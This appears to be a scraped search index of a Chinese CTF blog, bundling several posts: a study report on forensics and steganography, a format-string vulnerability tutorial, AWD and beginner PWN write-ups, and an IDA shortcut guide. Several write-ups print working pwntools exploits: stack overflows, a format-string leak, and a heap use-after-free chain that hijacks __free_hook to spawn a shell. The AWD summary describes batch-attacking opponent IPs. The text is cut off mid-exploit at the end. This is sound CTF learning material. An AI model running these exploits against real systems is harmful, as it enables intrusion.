；；；；；\n当然，如果用命令去做，要一个个去输入那个CRC32的值，过程比较繁琐，不过在这我用现成脚本梭了，原理都一样，我当时就用命令一个个去填的，太慢了。\n看回文件夹，有二维码，扫一下得到：\n密钥是\n!@#QWE123987\n用来打开tess.zip，里面有个还有个zip，拖进随波逐流或者看010editor，都可知道是伪加密的；\n看回mushroom.jpg，放随波逐流\n看回010editor，知道jpg文件的16进制码的末尾是FFD9，但这有很多个，再一次确定了这个文件的尾部被人为添加了数据。从此处下手。\n在上面图片上看到了IHDR，用png来对比，发现确实是图片，加个89504E47\n导出发现还是损坏，拖进随波逐流分析，还是多了东西，这是oursecret加密特征\n来到oursecret工具页面，会用到密钥\nflag{6f6bf445-8c9e-11ef-a06b-a4b1c1c5a2d2}\n未完全事项及原因 玩玩pwn。\n下周待做事项 备战盘古石、英语四级、校赛ctf、御网杯\n本周学习知识的分享 打完ucscctf赛事后，我学到了新知识，比如像CRC32碰撞、oursecret的隐写，\noursecret隐写：一个文件末尾出现多余内容，且不组成正常文件。基本可判定是此隐写\n熟悉运用猫脸变换的脚本；\n重温了snow隐写；\n我建议各位在平时不要老是使用一把梭的工具，老老实实用wireshark、010这种踏实手搓，理解底层原理再去一把梭抢分。\n2025.5.9 完成事项 刷了些取证题，刷了didctf2022新生赛、24盘古石初赛，看wp也七七八八啃下了，主要没工具太烦了，取证大师用起来也陌生还限时体验的；顺便加强了下流量取证这方面，https://forensics.didctf.com/challenges以下是我想要分享的一些包含重要知识的例题。\n经过几天的拷打，熟悉使用了三种盘古石工具和美亚的取证大师。做完了24盘古石初赛的计算机取证和手机取证，熟悉了题目的考察方向。\ndidctf2022新生赛 挑了点有代表性的题来做，作者AK了didctf2022😄。\n流量分析 这题纯知识点，一开始还想http、tcp、post的过滤的。\n看了几个私人blog才知道内网是有固定ip开头，内网地址开头10.0、192.168.xxx的开头IP，那我们下一步可以搜索10字节流就可以找到答案了，不过也确实难找，第一次做。dbhost是data base host缩写，译为数据库主机。\n内存取证 盘古石2024初赛：计算机取证\n查看内存检材的基本信息，这里考察内存取证，工具很多，一把梭、手搓都可：这里两种都有\n一把梭：\n答案是2024-04-25-22-18，加8因为是北京时间UTC+8：00，而这里是+0：00\n这是个误导点。手搓，就是用volatility指令，这里我用版本vol2.6.1为例：\n下一题\n看navicat.exe进程，用volatility的plist进程指令查看\nlovelymem一把梭：\n答案是 9336\nVolatility手搓：\n1 python vol.py -f \u0026#39;/home/kali/Desktop/memdump.mem\u0026#39; --profile=Win10x64 pslist 手搓时间有点长\u0026hellip;用取证大师、火眼的话直接秒杀的。\n","date":"2025-10-05T00:00:00Z","headings":[{"id":"20249-10","level":2,"text":"2024.9-10\n"},{"id":"2024114","level":2,"text":"2024.11.4\n"},{"id":"2024119","level":2,"text":"2024.11.9\n"},{"id":"20241116","level":2,"text":"2024.11.16\n"},{"id":"20241119","level":2,"text":"2024.11.19\n"},{"id":"20241129","level":2,"text":"2024.11.29\n"},{"id":"2025329","level":2,"text":"2025.3.29\n"},{"id":"20254","level":2,"text":"2025.4\n"},{"id":"2025425","level":2,"text":"2025.4.25\n"},{"id":"202559","level":2,"text":"2025.5.9\n"},{"id":"西电-moectf2024","level":3,"text":"西电-moectf2024\n"},{"id":"待做事项","level":3,"text":"待做事项\n"},{"id":"学习知识分享","level":3,"text":"学习知识分享\n"},{"id":"buuctf练习场","level":3,"text":"Buuctf练习场\n"},{"id":"buuctf-misccrypto","level":3,"text":"Buuctf-MISC、Crypto\n"},{"id":"西电-moectf2024-1","level":3,"text":"西电-moectf2024\n"},{"id":"西电newstars-ctf2024","level":3,"text":"西电Newstars-ctf2024\n"},{"id":"西电newstars-ctf2024-1","level":3,"text":"西电Newstars-ctf2024\n"},{"id":"西电newstars-ctf2024-2","level":3,"text":"西电Newstars-ctf2024\n"},{"id":"擅长音游的小明同学","level":3,"text":"擅长音游的小明同学\n"},{"id":"完成事项-2","level":3,"text":"完成事项\n"},{"id":"未完成事项及原因后续如何完成","level":3,"text":"未完成事项及原因（后续如何完成）\n"},{"id":"下周待做事项","level":3,"text":"下周待做事项\n"},{"id":"完成事项-3","level":3,"text":"完成事项\n"},{"id":"未完全事项及原因","level":3,"text":"未完全事项及原因\n"},{"id":"下周待做事项-1","level":3,"text":"下周待做事项\n"},{"id":"本周学习知识的分享","level":3,"text":"本周学习知识的分享\n"},{"id":"完成事项-4","level":3,"text":"完成事项\n"},{"id":"didctf2022新生赛","level":3,"text":"didctf2022新生赛\n"}],"image":"https://expl0rer.top/p/2024%E5%B9%B4%E9%A3%9E%E4%B9%A6%E5%91%A8%E6%8A%A5/%E9%A3%9E%E4%B9%A6%E5%91%A8%E6%8A%A5_hu_6c61bd494ec268c8.png","permalink":"https://expl0rer.top/p/2024%E5%B9%B4%E9%A3%9E%E4%B9%A6%E5%91%A8%E6%8A%A5/","title":"2024年——飞书周报"},{"content":"[TOC]\n前言：本期有所借鉴其他博主的讲解资料，内容有所重合，如有侵权随时下架重置。\nFMT介绍 格式化字符串函数：将计算机内存中表示的数据转化为我们人类可读的字符串格式。\n函数 介绍 printf 输出到stdout fprintf 输出到指定FILE流 vprintf 根据参数列表格式化输出道stdout vfprintf 根据参数列表格式输出道指定FILE流 sprintf 输出到字符串 snprintf 输出到指定字节数到字符串 vsprintf 根据参数列表格式化输出到字符串 vsnprintf 根据参数列表格式化输出指定字节到字符串 setproctitle 设置argv syslog 输出日志 err,verr,warn,vwarn等 。。。 用printf()为例子，第一个参数就是格式化字符串：\n%d ~ 十进制——输出十进制整数\n%s ~ 字符串——从内存中读取字符串\n%x ~ 十六进制——输出十六进制数\n%c ~ 字符——输出字符\n%p ~ 指针——指针地址\n%n ~ 到目前为止所写的字符数\n格式化字符串漏洞原理的利用 来看一种攻击案例，最简单的攻击方法，只需要输入一串%s就可以\n%s%s%s%s%s%s%s%s%s%s%s%s%s%s\n学过C语言都知道，每一个%s，会使printf()从栈上取一个数字，把该数字看做成地址，接着打印出该地址所指向的内存内容，这不就是隔山打牛吗？一个%s就能窃取隔壁的东西，有时这不太可取，万一你获取的数字是非法地址？所以有可数字对应的内容可能不存在，或者这个地址被保护的，那么程序就会因此崩溃或者停滞不前。\n在Linux中，存取无效的指针会引起进程收到SIGSEGV信号，从而使程序非正常终止并产生核心转储。\n用人话说就是：格式化字符串函数就是将计算机内存中表示的数据转化成我们人类可读的字符串格式。\n泄露内存（案例） 1 2 3 4 5 6 7 8 9 10 #include\u0026lt;stdio.h\u0026gt; int main(void) { char s[100]; int a = 1, b = 0x22222222, c = -1; scanf(\u0026#34;%s\u0026#34;, s); printf(\u0026#34;%08x.%08x.%08x.%s\\n\u0026#34;,a, b, c, s); printf(s); return 0; } 编译一下：\n1 gcc -m32 -fno-stack-protector -no-pie -o exp exp.c 在printf函数上面下个断点，然后r运行，输入%08x.%08x.%08x\n","date":"2025-10-04T00:00:00Z","headings":[{"id":"fmt介绍","level":2,"text":"FMT介绍\n"},{"id":"格式化字符串漏洞原理的利用","level":2,"text":"格式化字符串漏洞原理的利用\n"},{"id":"泄露内存案例","level":3,"text":"泄露内存（案例）\n"}],"image":"https://expl0rer.top/p/pwn-4/PWN4_hu_48c9a437f07b593c.png","permalink":"https://expl0rer.top/p/pwn-4/","title":"PWN-4"},{"content":"前言：激战时间是2025年10月4日15：00——16：30\nExploit 自己本地复现去吧。真是绝望啊，还以为是泄露canary值去绕过检查，结果别人就这样去溢出的。\nexp：\n1 2 3 4 5 6 7 8 9 from pwn import * io =process(\u0026#34;./pwn\u0026#34;) #io = remote... context(log_level=\u0026#39;debug\u0026#39;,os=\u0026#39;linux\u0026#39;,arch=\u0026#39;i386\u0026#39;) v5 = 0x1337BEEF payload = cyclic(32) + p32(v5) io.recvuntil(\u0026#34;Enter a string: \u0026#34;) io.sendline(payload) io.interactive() exploit的思路 牢，学了点新东西，别叫贴近实际。\n附件： pwn.7z\nGNU C 库（glibc）的动态链接库文件查询：\n1 strings ./pwn | grep -i \u0026#34;glibc\\|libc\u0026#34; checksec：\n32位程序，保护全开，不用说肯定是堆利用了\u0026hellip;。\nPWN程序部分源码：\nmain函数：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 int __cdecl main(int argc, const char **argv, const char **envp) { char s[32]; // [esp+0h] [ebp-30h] BYREF int v5; // [esp+20h] [ebp-10h] unsigned int v6; // [esp+24h] [ebp-Ch] int *p_argc; // [esp+28h] [ebp-8h] p_argc = \u0026amp;argc; v6 = __readgsdword(0x14u); v5 = 0; printf(\u0026#34;Enter a string: \u0026#34;); fflush(stdout); gets(s); if ( v5 == 0x1337BEEF ) { read_flag(); } else { printf(\u0026#34;\\nThe string \\\u0026#34;%s\\\u0026#34; is lame.\\n\u0026#34;, s); fflush(stdout); } return 0; } read_flag函数：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 unsigned int read_flag() { FILE *stream; // [esp+4h] [ebp-44h] char s[50]; // [esp+Ah] [ebp-3Eh] BYREF unsigned int v3; // [esp+3Ch] [ebp-Ch] v3 = __readgsdword(0x14u); stream = fopen(\u0026#34;flag.txt\u0026#34;, \u0026#34;r\u0026#34;); if ( !stream ) { printf(\u0026#34;File Error: flag.txt does not exist.\u0026#34;); fflush(stdout); exit(0); } fgets(s, 50, stream); printf(\u0026#34;Congratulations. Your string is not lame. Here you go: %s\\n\u0026#34;, s); fflush(stdout); return __readgsdword(0x14u) ^ v3; } 大致思路是v5等于0x1337BEEF就行了，但不能靠栈溢出，因为开了canary，这里应该用堆溢出了。\n做完才发现就是用栈溢出原理做的，太气人了\u0026hellip;🤯\ngdb调试看栈变化：\n可以看到canary地址居然在v5地址之下，也就是说我们刻意栈溢出到v5，再溢出超过v5才会触发栈溢出保护。\n那我们的payload就比较简单了，根据IDA分析的main函数可以知道：\n1 2 v5 = 0x1337BEEF payload = cyclic(32) + p32(v5) 完整exp在上面。\n再出题人没有刻意动题的情况下，canary地址一直都是00整结尾的，稍加留意，也是一种技巧。实在不行你一个个变量溢出看看，可以发现你把v5覆盖后却能正常运行，超过v5却退出程序运行了，这点很明显是canary地址在v5地址之下。\n","date":"2025-10-04T00:00:00Z","headings":[{"id":"exploit","level":2,"text":"Exploit\n"},{"id":"exploit的思路","level":2,"text":"exploit的思路\n"}],"image":"https://expl0rer.top/p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/awd2_hu_9959d663ffe91bd3.png","permalink":"https://expl0rer.top/p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/","title":"第二次AWD水友赛"},{"content":"前言：之前有人问私下问我WP写得不错，思路很清晰，但工具不知如何用，看到IDA那快捷键就头疼\u0026hellip;今天我也总结下我从入门CTF至今1年的IDA使用技巧，让你如鱼得水😄。\nPWNer和Reverser都可以看。\nIDA常用快捷键记录 基础快捷键 这里的快捷键在PWN题分析时也会用到，PWNer建议熟练掌握。\n1、切换文本视图与图表视图 空格键\n2、返回上一个操作地址 ESC\n3、搜索地址和符号 G\n4、对符号进行重命名 N\n5、常规注释 冒号键\n6、可重复注释 分号键\n7、添加标签 Alt+M\n8、查看标签 Ctrl+M\n9、查看段的信息 Ctrl+S\n10、查看交叉应用 X\n11、查看伪代码 F5\n12、搜索文本 Alt+T\n13、搜索十六进 Alt+B\n进阶快捷键 接下来的话相对灵活一些的分析使用，让你在分析源代码时比较轻松高效：\na：将数据转换为字符串\nf5：一键反汇编\nesc：回退键，能够倒回上一部操作的视图（只有在反汇编窗口才是这个作用，如果是在其他窗口按下esc，会关闭该窗口）\nshift+f12：可以打开string窗口，一键找出所有的字符串，右击setup，还能对窗口的属性进行设置\nctrl+w：保存ida数据库\nctrl+s：选择某个数据段，直接进行跳转\nctrl+鼠标滚轮：能够调节流程视图的大小\nx：对着某个函数、变量按该快捷键，可以查看它的交叉引用\ng：直接跳转到某个地址\nn：更改变量的名称\ny：更改变量的类型\n/ ：在反编译后伪代码的界面中写下注释\n\\：在反编译后伪代码的界面中隐藏/显示变量和函数的类型描述，有时候变量特别多的时候隐藏掉类型描述看起来会轻松很多\n；：在反汇编后的界面中写下注释\nctrl+shift+w：拍摄IDA快照\nu：undefine，取消定义函数、代码、数据的定义\n动态调试快捷键 F2：下断点\nF3：打开程序\nF4：运行到当前光标处（可应用在跳出 循坏）\nF7：单步步入（进函数）\nF8：单步 步过\nF9；运行\nF10：打开反汇编选项菜单快捷键\nF12:暂时停止\nCtrl+F2：重新开始\nArt+F2：结束跟踪\nShift+F2：打开附加选项窗口\nShift+F4：打开条件对话窗\nShift+F7：与F7相同，但是如果被调试程序发生异常而中止，调试器会首先尝试步入被调试程序指定的异常处理\nCtrl+F7：自动步入，在所有的函数调用中一条一条地执行命令，断点或异常时，自动 停止\nShift+F8与F8相同，但是如果被调试程序发生异常而中止，调试器会首先尝试步过被调试程序指定的异常处理\nCtrl+F8：自动步过，一条一条的执行命令，程序到达断点，或者发生异常时，自动步过过程都会停止\nShift+F9：与F9相同，但是如果被调试程序发生异常而中止，调试器会首先尝试执行被调试程序指定的异常处理\nCtrl+F9:执行直到返回，跟踪程序直到遇到返回，在此期间不进入子函数也不更新CPU数据。因为程序是一条一条命令执行的，所以速度可能会慢一些。按Esc键，可以停止跟踪。\nAlt+F9:执行直到返回到用户代码段，跟踪程序直到指令所属于的模块不在系统目录中，在此期间不进入子函数也不更新CPU数据。按Esc键，可以停止跟踪。\nCtrl+F11:Run跟踪步入，一条一条执行命令，进入每个子函数调用，并把寄存器的信息加入到Run跟踪的存储数据中。Run跟踪不会同步更新CPU窗口。\nCtrl+F12 :Run跟踪。步过，一条一条执行命令，但是不进入子函数调用，并把寄存器的信息加入到Run跟踪的存储数据中。Run跟踪不会同步更新CPU窗口。\nArt+C:快速回到主界面\nAlt+B:显示断点窗口\nAlt+E:显示模块窗口\nArt+L:显示记录窗口\nAlt+M:显示内存窗口\nAlt+O:显示调试选项窗口\nAlt+K:显示呼叫堆栈\nCtrl+E:编辑机器码\nCtrl+G:输入跟随地址\nCtrl+N:查找名称标志，选择你要下断的内容\nCtrl+S:打开查找命令次序窗口\nCtrl+P:显示补丁窗口\nCtrl+F9:返回到跟踪\nCtrl+F8:自动步进扫描，按F12可停止\nCtrl+F7:同上，功能略有不同\nCtrl+F6:回到OL主窗口\n总结 就这么多，死记硬背不太行，你可以边刷题边记。\n","date":"2025-10-02T00:00:00Z","headings":[{"id":"ida常用快捷键记录","level":2,"text":"IDA常用快捷键记录\n"},{"id":"总结","level":2,"text":"总结\n"},{"id":"基础快捷键","level":3,"text":"基础快捷键\n"},{"id":"进阶快捷键","level":3,"text":"进阶快捷键\n"}],"image":"https://expl0rer.top/p/ida%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/IDA_hu_c66ee304c9e1bb79.png","permalink":"https://expl0rer.top/p/ida%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/","title":"IDA使用指南"},{"content":"前言：激战时间是2025年10月2日13：10——17：00\nExploit思路 AI分析\u0026hellip;绷不住：\n自己本地复现去吧。\nexp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 from pwn import * # 环境配置 context.log_level = \u0026#39;debug\u0026#39; context.binary = elf = ELF(\u0026#39;./pwn\u0026#39;) context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] libc = ELF(\u0026#39;./libc.so.6\u0026#39;) io = process(elf.path) # 命令发送函数：发送指定命令编号 def cmd(c: int): io.sendlineafter(b\u0026#39;\u0026gt;\u0026#39;, str(c).encode()) # 捕获马匹函数：指定索引和颜色（0=bay,1=chestnut,2=gray） def catch(idx: int, color: int): cmd(1) io.sendlineafter(b\u0026#39;\u0026gt;\u0026#39;, str(idx).encode()) colors = [\u0026#34;bay\u0026#34;, \u0026#34;chestnut\u0026#34;, \u0026#34;gray\u0026#34;] io.sendlineafter(b\u0026#39;\u0026gt;\u0026#39;, colors[color].encode()) # 命名马匹函数：指定索引和名称（支持字节流） def naming(idx: int, name: bytes): cmd(2) io.sendlineafter(b\u0026#39;\u0026gt;\u0026#39;, str(idx).encode()) io.sendlineafter(b\u0026#39;\u0026gt;\u0026#39;, name) # 展示马匹函数：指定索引，触发信息输出 def show(idx: int): cmd(3) io.sendlineafter(b\u0026#39;\u0026gt;\u0026#39;, str(idx).encode()) # 马匹跳舞函数：指定索引，触发函数指针调用 def dance(idx: int): cmd(4) io.sendlineafter(b\u0026#39;\u0026gt;\u0026#39;, str(idx).encode()) # 释放马匹函数：指定索引，释放堆内存 def release(idx: int): cmd(5) io.sendlineafter(b\u0026#39;\u0026gt;\u0026#39;, str(idx).encode()) # 1. 泄露 PIE 基址：通过 show(-7) 读取非法索引内存 show(-7) piebase = u64(io.recvline().strip().ljust(8, b\u0026#39;\\x00\u0026#39;)) - 0x4008 success(\u0026#34;piebase: \u0026#34; + hex(piebase)) # 2. 创建 6 个马匹堆块（索引 0-2、5-7） catch(0, 0) catch(1, 1) catch(2, 2) catch(5, 0) catch(6, 1) catch(7, 2) # 3. 泄露堆基址：释放索引 0、1，通过 show(1) 读取残留堆地址 release(0) release(1) show(1) heap = u64(io.recvline().strip().ljust(8, b\u0026#39;\\x00\u0026#39;)) - 0x260 success(\u0026#34;heap: \u0026#34; + hex(heap)) # 4. 篡改堆块指针：通过 naming(1) 覆盖为 PIE 内数据地址，泄露 libc 基址 naming(1, p64(piebase + 0x4020)) catch(3, 0) catch(4, 1) show(4) libcbase = u64(io.recvline().strip().ljust(8, b\u0026#39;\\x00\u0026#39;)) - 0x3ec760 success(\u0026#34;libcbase: \u0026#34; + hex(libcbase)) # 5. 劫持 __free_hook：通过 UAF 漏洞篡改指针，写入 system 地址 release(5) release(6) naming(6, p64(libcbase + libc.sym[\u0026#39;__free_hook\u0026#39;])) catch(8, 0) catch(9, 1) naming(9, p64(libcbase + libc.sym[\u0026#39;system\u0026#39;])) # 6. 触发 system(\u0026#34;/bin/sh\u0026#34;)：命名索引 7 为 /bin/sh，释放时执行 naming(7, b\u0026#39;/bin/sh\\x00\u0026#39;) release(7) # 交互获取 shell io.interactive() 不足之处 我去\u0026hellip;第一次接触PWN-AWD，是真坐牢，什么都不会，看到free我就知道这下午肯定坐牢了\u0026hellip;\n附件： awd.7z\n第一次连，scp都连不上，多亏群主相助。\n总结 AWD 中的 PWN 选手是 “攻防双核心”，既要能快速打穿对手拿分，又要能守住己方不丢分，其表现直接影响团队的最终排名。\n攻击端任务：“打穿对手，拿 flag 得分” 攻击是 AWD 的核心得分手段，PWN 选手需在比赛初期快速完成 “漏洞挖掘→EXP 编写→批量攻击→flag 提交” 的闭环，具体步骤如下：\n1. 漏洞挖掘：快速定位可利用漏洞 比赛会为每个队伍提供相同的 PWN 程序（源码或二进制文件），PWN 选手需第一时间分析程序漏洞，重点关注：\n高危漏洞优先：优先挖掘可直接获取 Shell 的漏洞（如栈溢出、堆溢出、UAF、函数指针劫持等），其次是信息泄露漏洞（如格式化字符串、未初始化内存泄露，用于辅助获取 libc 基址、PIE 基址等）；\n结合程序逻辑：针对 AWD 常见的 PWN 程序类型（如菜单式程序、文件操作程序、网络服务程序），重点检查 “输入处理”（如gets/strcpy无长度限制）、“内存管理”（如 free 后未置空指针、堆块重叠）、“功能调用”（如可控函数指针、系统命令调用）等环节；\n工具辅助：用IDA Pro/Ghidra反编译二进制文件，checksec查看保护机制（PIE、RELRO、Stack Canary、NX），gdb动态调试验证漏洞触发条件。\n2. EXP 编写：高效生成攻击脚本 漏洞确认后，需编写自动化 Exploit（EXP）脚本，核心要求是稳定、通用：\n适配保护机制：\n1、若开启 PIE（地址随机化）：通过信息泄露漏洞（如 show 函数泄露）获取基址，动态计算目标地址；\n2、若开启 Stack Canary：判断是否可绕过（如通过 UAF 泄露 Canary 值），或优先选择无 Canary 保护的漏洞点；\n3、若开启 NX（栈不可执行）：构造 ROP 链调用system(\u0026quot;/bin/sh\u0026quot;)，或劫持__free_hook/__malloc_hook；\n自动化交互：用pwntools库封装程序交互逻辑（如菜单选择、输入发送、结果接收），确保 EXP 能自动完成 “连接目标→触发漏洞→获取 Shell→读取 flag” 的全流程；\n批量攻击适配：比赛中需攻击多个对手 IP（通常是 C 段或指定 IP 列表），EXP 需支持批量读取 IP 列表、多线程攻击，提升攻击效率。\n3. 漏洞利用：获取 Shell 与 flag 远程攻击：通过 EXP 连接对手服务器的 PWN 程序端口，触发漏洞获取 Shell（如system(\u0026quot;/bin/sh\u0026quot;)）；\nflag 读取：AWD 比赛中，flag 通常存放在固定路径（如/home/flag.txt、/tmp/flag），获取 Shell 后执行cat 路径读取 flag，按比赛要求提交（如 POST 到指定接口、写入己方 flag 存储目录）；\n横向扩展：若获取的 Shell 权限较高（如 root），可进一步横向渗透（如查看其他服务、种植后门），但需注意比赛规则（部分比赛禁止破坏对手服务器）。\n4. 对抗性优化：应对对手防御 随着比赛推进，对手会修复漏洞，PWN 选手需调整攻击策略：\n多漏洞备份：若主漏洞被修复，快速切换到备用漏洞（如主漏洞是栈溢出，备用漏洞是格式化字符串）；\n绕过修复：分析对手的修复逻辑（如简单添加长度检查），寻找绕过方法（如利用修复漏洞的逻辑缺陷，或构造特殊输入绕过检查）；\n0day 储备：若提前挖掘到未被普遍发现的漏洞（0day），可在后期对手放松防御时集中攻击，获取大量分数。\n防御端任务：“修复漏洞，守住己方服务器” 防御的核心是 “不让对手利用己方 PWN 程序漏洞”，需在攻击的同时快速完成漏洞修复，避免丢分：\n1. 漏洞修复：针对性修补漏洞点 根据攻击端挖掘的漏洞，对己方 PWN 程序进行最小化修复（避免过度修改导致程序无法运行），常见修复方式：\n栈溢出 / 堆溢出修复：\n替换危险函数（如gets→fgets、strcpy→strncpy），严格限制输入长度；\n对堆操作添加边界检查（如检查index是否在合法范围、堆块大小是否合理）；\n格式化字符串漏洞修复：\n将printf(user_input)改为printf(\u0026quot;%s\u0026quot;, user_input)，避免用户可控内容作为格式字符串；\nUAF 漏洞修复：\nfree内存后将指针置空（如free(list[index]); list[index] = NULL），后续使用前检查指针是否为NULL`；\n函数指针劫持修复：\n维护合法函数指针列表，调用前检查指针是否在列表内（如if (func_ptr != bay_dance \u0026amp;\u0026amp; func_ptr != chestnut_dance) return;）。\n2. 程序重编译与部署 编译选项加固：重新编译修复后的程序时，开启更严格的保护机制（如-fstack-protector-strong增强 Canary、-Wl,-z,relro,-z,now开启全 RELRO），提升对手攻击难度；\n快速部署：将修复后的程序替换己方服务器上的原程序，重启服务（注意避免服务中断时间过长，部分比赛会因服务不可用扣分）；\n验证修复效果：用己方编写的 EXP 测试修复后的程序，确认漏洞已被封堵（如 EXP 无法触发 Shell、程序无崩溃）。\n3. 日志监控与攻击溯源 日志分析：监控 PWN 程序的运行日志（如输入输出日志、系统调用日志），识别对手的攻击尝试（如异常输入、重复连接）；\n流量捕获：用tcpdump/wireshark捕获 PWN 程序端口的网络流量，分析对手的 EXP 特征（如固定 payload 开头、交互流程），为后续防御优化提供依据；\n应急响应：若发现己方服务器被攻击（如 flag 被窃取），立即检查 PWN 程序是否存在未修复的漏洞，或是否有新的漏洞被利用，快速二次修复。\n关键能力要求 漏洞挖掘速度：比赛初期（前 30 分钟）能否快速定位可利用漏洞，直接决定攻击的 “黄金窗口期”；\nEXP 稳定性：编写的 EXP 需能应对不同服务器环境（如不同 libc 版本、系统内核），避免因环境差异导致攻击失败；\n修复准确性：修复漏洞时需精准定位问题点，避免引入新 bug（如过度修改导致程序功能异常）；\n抗压能力：比赛中需同时处理 “攻击” 和 “防御”，需快速切换思路，应对对手的动态攻击策略。\n","date":"2025-10-02T00:00:00Z","headings":[{"id":"exploit思路","level":2,"text":"Exploit思路\n"},{"id":"不足之处","level":2,"text":"不足之处\n"},{"id":"总结","level":2,"text":"总结\n"},{"id":"攻击端任务打穿对手拿-flag-得分","level":3,"text":"攻击端任务：“打穿对手，拿 flag 得分”\n"},{"id":"防御端任务修复漏洞守住己方服务器","level":3,"text":"防御端任务：“修复漏洞，守住己方服务器”\n"},{"id":"关键能力要求","level":3,"text":"关键能力要求\n"}],"image":"https://expl0rer.top/p/%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/awd1_hu_37a249dfa45efc01.png","permalink":"https://expl0rer.top/p/%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/","title":"第一次AWD水友赛"},{"content":"[TOC]\n前言：\n出题作者是kagehutatsu，我花了3680金币购买的，虽说还是PWN入门，但我感觉做点浓缩的偏综合的入门PWN题更好些，CTFshow入门PWN题说实话确实适合当时0基础入门！😄\n本次入门PWN学习相当于我的第二次“入门”，以两外一种角度带入门者更进一步理解PWN基础知识，在CTFshow-入门PWN专题、PWN-1、PWN-2、PWN-3中出现的前置知识点，在这里有涉及到的我都会有所引用出来。\nPWN介绍 题目：xxx；就是没有题目，啥也没\n上程序nc连接看看，别说你不会nc\u0026hellip;\u0026hellip; PWN-1\n哎，输入啥都没有\u0026hellip;\n用IDA分析一下，跟进main函数：\n好家伙，看到system(\u0026quot;/bin/sh\u0026quot;);有if判断语句，意思就是说让我输入一个数（前面有个read函数限制大小，不过那玩意容量这么大，我再蠢也不会说输入两百多位字符给程序吧😄），这个数会被read函数读取给buf参数，接着到strcmp函数（比较作用，判断是否“不相等”）——if ( !strcmp(buf, \u0026quot;love\\n\u0026quot;) )意思是buf和“love”字符串相比的话是否相等，如果是真的就跳到下一步，显然if下方是system函数，我们就往程序输入love就好啦。\n看到下一步是被PWN通了的，我们可以进行交互模式了，用ls、cat命令拿到flag吧。\nPwntools与GBD使用 还是没题目\u0026hellip; PWN-2\n服了怎么开了canary啊，不是要栈溢出吗？\nIDA分析：\n这题和上题不同的是，这回v5要等于“520”才能执行system函数，但v5再此前是被赋值位“1314”的，单靠我们输入字符给程序不能拿到flag，用其它手段去修改v5。\n这不明摆要栈溢出覆盖v5？\n别急我们来gdb调试一下（gdb调试的确很难，涉及简化指令操作、汇编审计等，可以先看我写的文章再来用gdb）\n开gdb，断点：\n1 break main 输入r运行（run）\n这时候就会输出调试界面了，你可以用n一步步跳，看寄存器、地址等变化，我们要找一下canary的位置，看是否在v5之下，这样子我们就可以覆盖v5，但覆盖长度不超过v5，不会让canary被触发。\n查看栈：\n1 stack 40 第一行的是v4位置，第二行是canary位置（canary位置一般都在末尾有00整数的地址，除非出题人特别还去调了canary的位置就另说😄），欸？v5去哪了，v5应该是0x522（十进制转为520），这里没看到0x522的身影。\n看回IDA：\n当前stack输出中，rbp的地址是0x7fffffffdaf0；\n所以说应当是v5的地址 = 0x7fffffffdaf0 - 0xC = 0x7fffffffdae4\n这里调试界面似乎没看到v5呢\u0026hellip;\n查看当前stack输出，0x7fffffffdae4这个地址没有直接显示在stack 40的条目里，但它位于两个显示条目之间：\nstack条目序号 地址 说明 与v5地址的关系 00:0000 0x7fffffffdae0 v4的地址（char[4]数组） v5地址（dae4）在其高地址侧（相差 4 字节，因v4占 4 字节） 01:0008 0x7fffffffdae8 Canary（v6）的地址 v5地址（dae4）在其低地址侧（相差 4 字节，因v5占 4 字节） 简单说：v5夹在v4（dae0）和Canary（dae8）之间，地址是0x7fffffffdae4，对应栈中 “dae0之后、dae8之前” 的 4 字节内存。\n虽然stack命令没直接显示dae4，但可在pwndbg中用x命令直接查看该地址的v5值（指定int类型格式）：\n1 2 # 格式说明：/w=4字节（int类型），x=十六进制，查看0x7fffffffdae4地址 x/wx 0x7fffffffdae4 之所以在stack 40中看不到v5的地址，是因为stack命令默认按 “8 字节步长” 显示栈条目（64 位系统），而v5的地址dae4是 “非 8 字节对齐” 的中间地址，需手动查看。\n这时候我们就知道v5在canary之上了，覆盖v5的话，canary不会知道。\nexp：\n1 2 3 4 5 6 7 8 from pwn import * io = remote(\u0026#39;node6.anna.nssctf.cn\u0026#39;, 23886) context(os=\u0026#34;linux\u0026#34;, arch=\u0026#34;amd64\u0026#34;, log_level=\u0026#34;debug\u0026#34;) payload = b\u0026#39;A\u0026#39; * 4 + p32(0x208) num = u64(payload.ljust(8, b\u0026#39;\\x00\u0026#39;)) io.recvuntil(\u0026#34;Hello! Input a number:\u0026#34;) io.sendline(str(num)) io.interactive() 可能我的WP比较复杂，看起来非常非常难，但只不过我把每一步都细化了，每一步都是我的思考直面呈现给你，让你PWN-0基础都能接近看懂的。\n整数溢出 PWN-3\nchecksec\nIDA64分析：\n在函数目录看到了vuln函数：\n地址也给了：0x4011dd\n那我们在在栈溢出之后，用这个vuln地址覆盖返回地址，让程序返回到这个地址执行/bin/sh。\nexp：\n1 2 3 4 5 6 7 8 from pwn import * io = remote(\u0026#39;node7.anna.nssctf.cn\u0026#39;, 21218) context(os=\u0026#34;linux\u0026#34;, arch=\u0026#34;amd64\u0026#34;, log_level=\u0026#34;debug\u0026#34;) vuln = 0x4011dd payload = cyclic(0x20+8) + p64(vuln) io.sendline(payload) io.recv() io.interactive() ret2text及其变种 PWN-4\nchecksec：\nIDA64分析：\nexp：\n1 2 3 4 5 6 7 8 from pwn import * io = remote(\u0026#39;node6.anna.nssctf.cn\u0026#39;, 28672) context(os=\u0026#34;linux\u0026#34;, arch=\u0026#34;amd64\u0026#34;, log_level=\u0026#34;debug\u0026#34;) vuln = 0x4011ff payload = cyclic(0x20+8) + 